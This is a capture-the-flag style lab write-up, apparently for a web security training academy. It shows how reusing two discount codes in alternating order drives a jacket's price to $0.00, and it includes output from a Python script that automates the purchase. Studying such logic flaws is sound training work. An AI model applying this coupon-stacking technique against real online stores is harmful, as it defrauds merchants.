# Lab: Flawed enforcement of business rules

### Instructions

This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: `wiener:peter `

### Solution

Logging into the application we find two interesting messages.

First we find: ` New customers use code at checkout: NEWCUST5`.

Next we see that we have a credit of $100.00. 

```
Store credit: $100.00
```

Adding the jacket to our cart and entering in the new customer code, we find $5.00 has been removed from the price:

```
Code 	Reduction
NEWCUST5	-$5.00
Total: 	$1332.00
```

Also of interest is at the bottom of the Home page there is a newsletter signup form. If we enter a fake address test@test.com, and signup for the newsletter, we get the following message:

```
Use coupon SIGNUP30 at checkout!
```

Applying this discount code to our cart reduces the price further:

```
Code 	Reduction
NEWCUST5	-$5.00
SIGNUP30	-$401.10
Total: 	$930.90
```

Continuing to test these codes, we find they can be re-used (in alternating order) several times in order to bring the price down to $0.00:

```
Code 	Reduction
NEWCUST5	-$5.00
SIGNUP30	-$401.10
NEWCUST5	-$5.00
SIGNUP30	-$401.10
NEWCUST5	-$5.00
SIGNUP30	-$401.10
NEWCUST5	-$5.00
SIGNUP30	-$401.10
Total: 	$0.00
```

We can then checkout, which completes the lab:

```
Your order is on its way!
Name 	Price 	Quantity 	
Lightweight "l33t" Leather Jacket 	$1337.00 	1 	
NEWCUST5	-$5.00		
SIGNUP30	-$401.10		
NEWCUST5	-$5.00		
SIGNUP30	-$401.10		
NEWCUST5	-$5.00		
SIGNUP30	-$401.10		
NEWCUST5	-$5.00		
SIGNUP30	-$401.10		
Total: 	$0.00
```

### Python Automation

See `logic_vuln_04.py`.
```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Business_Logic_Vulnerabilities/Logic_Vuln_04_flawed_enforcement_of_business_rules]
└─$ python logic_vuln_04.py https://0a8800c204e19f3082220636004d00a1.web-security-academy.net/
[+] Login successful
[*] Adding jacket to cart...
[*] Applying discount codes...
[+] Coupon: NEWCUST5 -> Price: $1332.00
[+] Coupon: SIGNUP30 -> Price: $930.90
[+] Coupon: NEWCUST5 -> Price: $925.90
[+] Coupon: SIGNUP30 -> Price: $524.80
[+] Coupon: NEWCUST5 -> Price: $519.80
[+] Coupon: SIGNUP30 -> Price: $118.70
[+] Coupon: NEWCUST5 -> Price: $113.70
[+] Coupon: SIGNUP30 -> Price: $0.00
[*] Checking out...
[+] Checkout successful - Lab solved!
```